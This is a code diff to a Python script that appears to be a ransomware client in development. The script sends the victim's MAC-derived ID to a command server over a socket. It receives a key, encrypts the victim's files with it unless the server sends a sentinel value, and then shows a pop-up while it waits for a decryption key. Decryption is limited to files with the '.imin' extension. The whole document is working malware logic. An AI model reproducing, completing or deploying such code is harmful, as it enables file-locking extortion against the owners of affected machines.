@@ -7,6 +7,7 @@ import sys
 from threading import Thread
 import uuid
 
+import interface
 
 def recursiveScan(baseDir):
     # scan current directory
@@ -69,17 +70,12 @@ def decryptFiles(key):
         filePath = Path(item)
         extension = filePath.suffix.lower()
 
-        if extension in exclude:
-            continue
-        decrypt(filePath, key)
+        if extension == '.imin':
+            decrypt(filePath, key)
 
 # way to ID
-MESSAGE = uuid.getnode()
+MESSAGE = uuid.getnode().to_bytes(48, 'big')
 
-# key is given by server
-### Temporary
-key = Fernet.generate_key()
-### ----------
 HOST = 'localhost'
 PORT = 5789
 
@@ -89,11 +85,12 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 print('Connected!')
 s.send(MESSAGE)
-socket_list = [sys.stdin, s]
 
 while 1:
-    read_sockets, write_sockets, error_sockets = select.select(socket_list, [], [])
+    read_sockets, write_sockets, error_sockets = select.select([s], [], [])
 
+    # key = encrypt
+    # wait = decrypt
     for sock in read_sockets:
         if sock == s:
             data = sock.recv(4096)
@@ -101,5 +98,11 @@ while 1:
                 print('\nDisconnected from server')
                 sys.exit()
             else:
-                message = data.decode()
-                print(message)
+                key = data.decode()
+                if key != 'XD':
+                    encryptFiles(key)
+                
+                interface.pop_up_win()
+                '''
+                    Wait until I recieve a key for decryption.
+                '''
